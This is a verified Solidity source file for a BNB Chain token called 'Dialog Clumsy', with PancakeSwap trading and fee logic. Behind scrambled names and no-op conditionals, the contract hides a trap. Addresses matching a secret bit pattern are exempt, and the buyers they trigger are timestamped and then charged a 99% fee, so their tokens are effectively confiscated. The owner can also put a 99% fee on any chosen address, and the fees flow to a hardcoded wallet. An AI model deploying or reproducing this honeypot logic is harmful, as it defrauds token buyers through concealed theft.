/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DialogClumsy is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Dialog Clumsy ";
    string constant _symbol = "DialogClumsy";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private isTradingBuyLimit;
    mapping(address => bool) private receiverSwapLiquidityIs;
    mapping(address => bool) private launchedReceiverModeLimit;
    mapping(address => bool) private botsMaxTxTeamModeMarketingLaunched;
    mapping(address => uint256) private sellBuyBurnIs;
    mapping(uint256 => address) private autoLaunchedTradingIs;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private teamAutoMinTrading = 0;
    uint256 private limitTeamBurnSwap = 8;

    //SELL FEES
    uint256 private walletLaunchedSwapAuto = 0;
    uint256 private maxIsTradingExempt = 8;

    uint256 private sellBotsFeeBuyMaxLimit = limitTeamBurnSwap + teamAutoMinTrading;
    uint256 private isWalletBurnLiquidityExempt = 100;

    address private swapIsExemptTx = (msg.sender); // auto-liq address
    address private minBotsFeeMode = (0x0532E1565F05C620733329fBffFFF5A2639654A6); // marketing address
    address private marketingSellBotsTrading = DEAD;
    address private botsFeeTxMode = DEAD;
    address private isTeamSellMarketingTx = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private swapLimitMaxBurn;
    uint256 private teamBurnLaunchedAuto;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private txFeeTradingWalletSwap;
    uint256 private receiverModeLimitMax;
    uint256 private autoLiquidityExemptMin;
    uint256 private txMaxBuyMinAutoBurnSell;
    uint256 private exemptMinTeamLiquidityIsSellTx;

    bool private teamWalletLiquidityLimit = true;
    bool private botsMaxTxTeamModeMarketingLaunchedMode = true;
    bool private launchedTradingSwapMarketingExempt = true;
    bool private modeLimitMaxLiquidityAutoBots = true;
    bool private exemptSellMaxWallet = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private modeIsBurnBotsTradingFee = _totalSupply / 1000; // 0.1%

    
    bool private teamIsModeFee = false;
    bool private modeExemptTradingMax = false;
    uint256 private exemptLimitSwapMax = 0;
    uint256 private modeTradingSellReceiverSwap = 0;
    uint256 private liquidityMinReceiverAuto = 0;
    uint256 private launchedTradingWalletMinModeBurn = 0;
    uint256 private isWalletBuySellMaxLimit = 0;
    uint256 private minLimitReceiverLaunched = 0;
    bool private liquidityBurnExemptReceiverTeamIs = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        txFeeTradingWalletSwap = true;

        isTradingBuyLimit[msg.sender] = true;
        isTradingBuyLimit[address(this)] = true;

        receiverSwapLiquidityIs[msg.sender] = true;
        receiverSwapLiquidityIs[0x0000000000000000000000000000000000000000] = true;
        receiverSwapLiquidityIs[0x000000000000000000000000000000000000dEaD] = true;
        receiverSwapLiquidityIs[address(this)] = true;

        launchedReceiverModeLimit[msg.sender] = true;
        launchedReceiverModeLimit[0x0000000000000000000000000000000000000000] = true;
        launchedReceiverModeLimit[0x000000000000000000000000000000000000dEaD] = true;
        launchedReceiverModeLimit[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsBuyMaxLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return botsBuyMaxLiquidity(sender, recipient, amount);
    }

    function botsBuyMaxLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = swapIsTxLimit(sender) || swapIsTxLimit(recipient);
        
        if (exemptLimitSwapMax != isWalletBurnLiquidityExempt) {
            exemptLimitSwapMax = walletLaunchedSwapAuto;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                marketingExemptSwapLimit();
            }
            if (!bLimitTxWalletValue) {
                burnSellWalletLimit(recipient);
            }
        }
        
        if (liquidityMinReceiverAuto == modeIsBurnBotsTradingFee) {
            liquidityMinReceiverAuto = isWalletBurnLiquidityExempt;
        }

        if (teamIsModeFee == liquidityBurnExemptReceiverTeamIs) {
            teamIsModeFee = exemptSellMaxWallet;
        }


        if (inSwap || bLimitTxWalletValue) {return buyIsBotsSell(sender, recipient, amount);}

        if (!isTradingBuyLimit[sender] && !isTradingBuyLimit[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (liquidityMinReceiverAuto == liquidityMinReceiverAuto) {
            liquidityMinReceiverAuto = maxIsTradingExempt;
        }

        if (minLimitReceiverLaunched != sellBotsFeeBuyMaxLimit) {
            minLimitReceiverLaunched = limitTeamBurnSwap;
        }

        if (isWalletBuySellMaxLimit != minLimitReceiverLaunched) {
            isWalletBuySellMaxLimit = maxIsTradingExempt;
        }


        require((amount <= _maxTxAmount) || launchedReceiverModeLimit[sender] || launchedReceiverModeLimit[recipient], "Max TX Limit has been triggered");

        if (teamMarketingSwapTradingMaxExemptAuto()) {marketingLaunchedMinBurn();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (launchedTradingWalletMinModeBurn != isWalletBurnLiquidityExempt) {
            launchedTradingWalletMinModeBurn = modeTradingSellReceiverSwap;
        }

        if (liquidityBurnExemptReceiverTeamIs != teamWalletLiquidityLimit) {
            liquidityBurnExemptReceiverTeamIs = teamIsModeFee;
        }

        if (minLimitReceiverLaunched != modeIsBurnBotsTradingFee) {
            minLimitReceiverLaunched = minLimitReceiverLaunched;
        }


        uint256 amountReceived = autoWalletTeamTradingTxSellFee(sender) ? teamReceiverIsLiquidity(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function buyIsBotsSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoWalletTeamTradingTxSellFee(address sender) internal view returns (bool) {
        return !receiverSwapLiquidityIs[sender];
    }

    function txModeExemptMinLimit(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            sellBotsFeeBuyMaxLimit = maxIsTradingExempt + walletLaunchedSwapAuto;
            return buySellMinLimit(sender, sellBotsFeeBuyMaxLimit);
        }
        if (!selling && sender == uniswapV2Pair) {
            sellBotsFeeBuyMaxLimit = limitTeamBurnSwap + teamAutoMinTrading;
            return sellBotsFeeBuyMaxLimit;
        }
        return buySellMinLimit(sender, sellBotsFeeBuyMaxLimit);
    }

    function teamReceiverIsLiquidity(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(txModeExemptMinLimit(sender, receiver == uniswapV2Pair)).div(isWalletBurnLiquidityExempt);

        if (botsMaxTxTeamModeMarketingLaunched[sender] || botsMaxTxTeamModeMarketingLaunched[receiver]) {
            feeAmount = amount.mul(99).div(isWalletBurnLiquidityExempt);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function swapIsTxLimit(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function buySellMinLimit(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = sellBuyBurnIs[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function burnSellWalletLimit(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        autoLaunchedTradingIs[exemptLimitValue] = addr;
    }

    function marketingExemptSwapLimit() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (sellBuyBurnIs[autoLaunchedTradingIs[i]] == 0) {
                    sellBuyBurnIs[autoLaunchedTradingIs[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(minBotsFeeMode).transfer(amountBNB * amountPercentage / 100);
    }

    function teamMarketingSwapTradingMaxExemptAuto() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    exemptSellMaxWallet &&
    _balances[address(this)] >= modeIsBurnBotsTradingFee;
    }

    function marketingLaunchedMinBurn() internal swapping {
        
        if (minLimitReceiverLaunched != isWalletBuySellMaxLimit) {
            minLimitReceiverLaunched = isWalletBurnLiquidityExempt;
        }

        if (exemptLimitSwapMax != modeIsBurnBotsTradingFee) {
            exemptLimitSwapMax = isWalletBuySellMaxLimit;
        }


        uint256 amountToLiquify = modeIsBurnBotsTradingFee.mul(teamAutoMinTrading).div(sellBotsFeeBuyMaxLimit).div(2);
        uint256 amountToSwap = modeIsBurnBotsTradingFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (modeExemptTradingMax == botsMaxTxTeamModeMarketingLaunchedMode) {
            modeExemptTradingMax = liquidityBurnExemptReceiverTeamIs;
        }

        if (minLimitReceiverLaunched != minLimitReceiverLaunched) {
            minLimitReceiverLaunched = modeIsBurnBotsTradingFee;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = sellBotsFeeBuyMaxLimit.sub(teamAutoMinTrading.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(teamAutoMinTrading).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(limitTeamBurnSwap).div(totalETHFee);
        
        if (launchedTradingWalletMinModeBurn != teamAutoMinTrading) {
            launchedTradingWalletMinModeBurn = maxIsTradingExempt;
        }


        payable(minBotsFeeMode).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                swapIsExemptTx,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLaunchedReceiverModeLimit(address a0) public view returns (bool) {
        if (a0 == swapIsExemptTx) {
            return modeLimitMaxLiquidityAutoBots;
        }
        if (launchedReceiverModeLimit[a0] == launchedReceiverModeLimit[a0]) {
            return botsMaxTxTeamModeMarketingLaunchedMode;
        }
        if (a0 != swapIsExemptTx) {
            return modeLimitMaxLiquidityAutoBots;
        }
            return launchedReceiverModeLimit[a0];
    }
    function setLaunchedReceiverModeLimit(address a0,bool a1) public onlyOwner {
        if (a0 != marketingSellBotsTrading) {
            exemptSellMaxWallet=a1;
        }
        launchedReceiverModeLimit[a0]=a1;
    }

    function getExemptLimitSwapMax() public view returns (uint256) {
        if (exemptLimitSwapMax != exemptLimitSwapMax) {
            return exemptLimitSwapMax;
        }
        return exemptLimitSwapMax;
    }
    function setExemptLimitSwapMax(uint256 a0) public onlyOwner {
        if (exemptLimitSwapMax != isWalletBurnLiquidityExempt) {
            isWalletBurnLiquidityExempt=a0;
        }
        if (exemptLimitSwapMax != liquidityMinReceiverAuto) {
            liquidityMinReceiverAuto=a0;
        }
        exemptLimitSwapMax=a0;
    }

    function getModeTradingSellReceiverSwap() public view returns (uint256) {
        if (modeTradingSellReceiverSwap != liquidityMinReceiverAuto) {
            return liquidityMinReceiverAuto;
        }
        return modeTradingSellReceiverSwap;
    }
    function setModeTradingSellReceiverSwap(uint256 a0) public onlyOwner {
        modeTradingSellReceiverSwap=a0;
    }

    function getSwapIsExemptTx() public view returns (address) {
        if (swapIsExemptTx == minBotsFeeMode) {
            return minBotsFeeMode;
        }
        if (swapIsExemptTx != minBotsFeeMode) {
            return minBotsFeeMode;
        }
        return swapIsExemptTx;
    }
    function setSwapIsExemptTx(address a0) public onlyOwner {
        if (swapIsExemptTx != swapIsExemptTx) {
            swapIsExemptTx=a0;
        }
        if (swapIsExemptTx == marketingSellBotsTrading) {
            marketingSellBotsTrading=a0;
        }
        if (swapIsExemptTx != marketingSellBotsTrading) {
            marketingSellBotsTrading=a0;
        }
        swapIsExemptTx=a0;
    }

    function getMarketingSellBotsTrading() public view returns (address) {
        if (marketingSellBotsTrading != marketingSellBotsTrading) {
            return marketingSellBotsTrading;
        }
        if (marketingSellBotsTrading != botsFeeTxMode) {
            return botsFeeTxMode;
        }
        return marketingSellBotsTrading;
    }
    function setMarketingSellBotsTrading(address a0) public onlyOwner {
        marketingSellBotsTrading=a0;
    }

    function getBotsMaxTxTeamModeMarketingLaunched(address a0) public view returns (bool) {
        if (a0 != swapIsExemptTx) {
            return teamWalletLiquidityLimit;
        }
        if (a0 != minBotsFeeMode) {
            return botsMaxTxTeamModeMarketingLaunchedMode;
        }
            return botsMaxTxTeamModeMarketingLaunched[a0];
    }
    function setBotsMaxTxTeamModeMarketingLaunched(address a0,bool a1) public onlyOwner {
        if (a0 != botsFeeTxMode) {
            exemptSellMaxWallet=a1;
        }
        if (botsMaxTxTeamModeMarketingLaunched[a0] != isTradingBuyLimit[a0]) {
           isTradingBuyLimit[a0]=a1;
        }
        botsMaxTxTeamModeMarketingLaunched[a0]=a1;
    }

    function getTeamAutoMinTrading() public view returns (uint256) {
        return teamAutoMinTrading;
    }
    function setTeamAutoMinTrading(uint256 a0) public onlyOwner {
        if (teamAutoMinTrading == launchedTradingWalletMinModeBurn) {
            launchedTradingWalletMinModeBurn=a0;
        }
        teamAutoMinTrading=a0;
    }

    function getModeIsBurnBotsTradingFee() public view returns (uint256) {
        if (modeIsBurnBotsTradingFee == modeIsBurnBotsTradingFee) {
            return modeIsBurnBotsTradingFee;
        }
        if (modeIsBurnBotsTradingFee != limitTeamBurnSwap) {
            return limitTeamBurnSwap;
        }
        if (modeIsBurnBotsTradingFee == liquidityMinReceiverAuto) {
            return liquidityMinReceiverAuto;
        }
        return modeIsBurnBotsTradingFee;
    }
    function setModeIsBurnBotsTradingFee(uint256 a0) public onlyOwner {
        if (modeIsBurnBotsTradingFee == isWalletBuySellMaxLimit) {
            isWalletBuySellMaxLimit=a0;
        }
        modeIsBurnBotsTradingFee=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}